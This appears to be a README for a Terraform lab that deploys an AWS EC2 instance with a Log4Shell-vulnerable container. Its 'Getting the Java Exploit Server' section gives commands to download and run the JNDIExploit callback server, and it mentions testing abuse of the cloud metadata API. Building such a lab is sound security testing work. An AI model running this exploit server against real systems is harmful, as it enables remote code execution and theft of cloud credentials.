

## Customize this deployment

### Credentials 
- `provider.tf` file should outline path to aws config file along with the named profile you want to use.

- Input the public key you want to use to connect to the EC2 instance in the `variables.tf` file as the value of `public_key`.

### Naming Things 
- Change the value of `deployment_prefix` variable to change the name of the resources deployed.  If you don't change this all your AWS resoures will be named in my honor.


## Steps to Deployment

- Ensure you have a valid aws session credential
	``aws sso login --profile [named-prodile]``

- Terraform
	`terraform plan`
	`terraform apply --auto-approve`

## Connecting to your EC2 Instance

- You can use EC2 Instance Connect (SSH from the Browser) to connect to your EC2 instance. Ingress rules allowing this are include in the deployment
- If you configured a public key for the EC2 instance and allowed your IP in the security groups, you can directly SSH to the EC2 instance

## Getting the Java Exploit Server choochin'

Installation of the java server and environment during deployment is not working.  Once your EC2 is up and running, you'll want to install the following:
- `sudo yum install java-1.8.0-openjdk -y`
- `wget http://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip`
- `unzip JNDIExploit.v1.2.zip`
- `MY_IP=$(hostname -I | awk '{print $1}')`
- `java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $MY_IP -p 8888`

The JNDI Exploit Server needs to be running and receiving callbacks from the vulnerable docker container.

## Vulnarable Docker Container
This container will be listenting on 127.0.0.1:8080.
If you want to install curl in the container for testing the abuse of the metadata api:
`sudo docker exec vulnerable-app apk add curl`

## Testing Exploits

Instructions for starting and operating the [JNDI Exploit Server](http://web.archive.org/web/20211210111026/https://github.com/feihong-cs/JNDIExploit)

Instructions operating against the [vulnerable docker container](https://github.com/christophetd/log4shell-vulnerable-app)








